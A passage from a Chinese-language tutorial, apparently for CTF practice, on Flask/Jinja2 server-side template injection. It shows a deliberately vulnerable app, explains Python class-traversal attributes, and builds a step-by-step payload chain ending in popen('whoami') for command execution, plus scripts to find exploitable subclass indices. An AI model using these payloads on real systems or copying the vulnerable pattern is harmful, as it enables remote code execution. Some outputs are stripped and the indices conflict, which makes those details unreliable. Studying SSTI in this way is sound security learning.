        '''
        return render_template_string(html_str,str=str)
    if __name__ == '__main__':
        app.debug = True
        app.run('127.0.0.1','8080')
  * 但是如果变成下面这个代码，发现了对用户传入的数据没有任何过滤，就直接将用户传入的参数值放入html_str中，然后经过模板渲染，直接输出，用户完全对输入值可控，就会照成SSTI漏洞，传入一个弹窗代码，查看效果
    from importlib.resources import contents
    import time
    from flask import Flask,request,redirect,url_for,render_template_string,render_template
    app = Flask(__name__)
    @app.route('/',methods = ['GET'])
    def index():
        str = request.args.get('v')
        html_str = '''
            {0}
        '''.format(str)
        return render_template_string(html_str)
    if __name__ == '__main__':
        app.debug = True
        app.run('127.0.0.1','8080')
  * 如果把恶意代码放在第一个代码中，就不会出现这种问题，因为已经被转义了，所以不会执行，而第二种就造成了信息泄露，但是还可以将危害扩大化，直接造成任意文件读取和RCE，在可以保证能看懂的
### 魔术方法：
    __class__ # 查找当前类型的所属对象
    __mro__ # 查找当前类对象的所有继承类
    __subclasses__ # 查找父类下的所有子类
    __globals__ # 函数会议字典的形式返回当前对象的全部全局变量
    __init__ #查看类是否重载，重载是指程序在运行是就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载
    __base__ # 沿着父子类的关系往上走一个
    object是父子关系的顶端，所有的数据类型最终的父类都是object
    type是类型实例关系，所有对象都是type的实例
    object和type既是类也是实例，因为object是type的一个实例，但是type又是object的子类，type自己创造了自己，object是type的父类，type创造了object
`__class__`:用于返回对象所属的类
    ''.__class__
    #
    ().__class__
    #
    [].__class__
    #
`__base__`:以字符串的形式返回一个类所继承的类
`__bases__`:以元组的形式返回一个类所继承的类
`__mro__`:返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类
    class Father():
         def __init__(self):
                 pass
    class GrandFather():
         def __init__(self):
                 pass
    class son(Father,GrandFather):
                pass
    print(son.__base__)
    #
    print(son.__bases__)
    #(, )
    print(son.__mro__)
    #(, , , )
`__subclasses__()`:获取类的所有子类
`__init__`:所有自带带类都包含init方法，常用他当跳板来调用globals
`__globals__`:会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合init使用
### 继承关系：
通过一个子类找到父类，父类再找子类，再找到全局变量，这就是继承关系，一层一层往上找：
    class A:pass
    class B(A):pass
    class C(B):pass
    a = A()
    b = B()
    c = C()
    print('a的继承关系：',end='')
    print(a.__class__.__mro__)
    print('b的继承关系：',end='')
    print(b.__class__.__mro__)
    print('c的继承关系：',end='')
    print(c.__class__.__mro__)
    # 输出
    # a父类是object
    a的继承关系：(, ) 
    # b的父类是A，然后才是object
    b的继承关系：(, , )
    # c的父类是B，然后再是A，最后是object
    c的继承关系：(, , , )
    # 一层层关系递进，形成一个继承关系
### POC构造：
漏洞代码：
    from flask import Flask,request,render_template_string
    app = Flask(__name__)
    @app.route('/', methods=['GET', 'POST'])
    def index():
        name = request.args.get('name')
        template = '''
        SSTI
          Hello, %s !
            '''% (name)
        return render_template_string(template)
    if __name__ == "__main__":
        app.run(host="0.0.0.0", port=5000, debug=True)
#### 第一步：
==目的：使用`__class__`来获取内置类所对应的类==
可以通过使用`str`，`list`，`tuple`，`dict`等来获取
    >>>''.__class__
    #
    >>>().__class__
    #
    >>>[].__class__
    #
    >>>{}.__class__
    #
#### 第二步:
==目的：拿到`object`基类==
  * 用`__bases__[0]`拿到基类:
    >>> ''.__class__.__bases__[0]
  * 用`__base__`拿到基类:
    >>> ''.__class__.__base__
    #
  * 用`__mro__[1]`或者`__mro__[-1]`拿到基类:
    >>> ''.__class__.__mro__[1]
    #
    >>> ''.__class__.__mro__[-1]
    #
#### 第三步：
==目的：用`__subclasses__()`拿到子类列表==
    >>> ''.__class__.__bases__[0].__subclasses__()
    #...一大堆的子类
#### 第四步：
==目的：在子类列表中找到可以getshell的类==
先知晓一些可以getshell的类，然后再去跑这些类的索引，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以popen为例子：（本地遍历）
    search = 'popen'
    num = -1
    for i in ().__class__.__bases__[0].__subclasses__():
        num +=1
        try:
            if search in i.__init__.__globals__.keys():
                print(i,num)
        except:
            pass
    ###运行###
     134
     135
  * 可以发现`object`基类的第34个子类名为`os._wrap_close`的这个类有popen方法，先调用它的`__init__`方法进行初始化类
    >>> {{"".__class__.__bases__[0].__subclasses__()[134].__init__}}
  * 再调用`__globals__`可以获取到方法内以字典的形式返回的方法、属性等值
    >>> "".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__
  * 然后就可以调用其中的popen来执行命令
    >>> "".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
  * 但是上面的方法仅限于在本地寻找，因为在做CTF题目的时候，我们无法在题目环境中运行这个`find.py`
### 寻找利用类：
**脚本索引：**
**本地遍历** ：
    find.py
    search = 'popen'
    num = -1
    for i in ().__class__.__bases__[0].__subclasses__():
        num +=1
        try:
            if search in i.__init__.__globals__.keys():
                print(i,num)
        except:
            pass
    ###运行###
     134
     135
    find2.py
    我们首先把所有的子类列举出来
    {{().__class__.__bases__[0].__subclasses__()}}
    然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类
    import json
    a = """
    ,...,
    """
    num = 0
    allList = []
    result = ""
    for i in a:
        if i == ">":
            result += i
            allList.append(result)
            result = ""
        elif i == "\n" or i == ",":
            continue
        else:
            result += i
    for k,v in enumerate(allList):
        if "os._wrap_close" in v:
            print(str(k)+"--->"+v)
    用requests模块脚本来跑：
    find3.py
    import requests
    import time
    import html
    for i in range(0,300):
        time.sleep(0.06)
        payload="{{().__class__.__mro__[-1].__subclasses__()[%s]}}"% i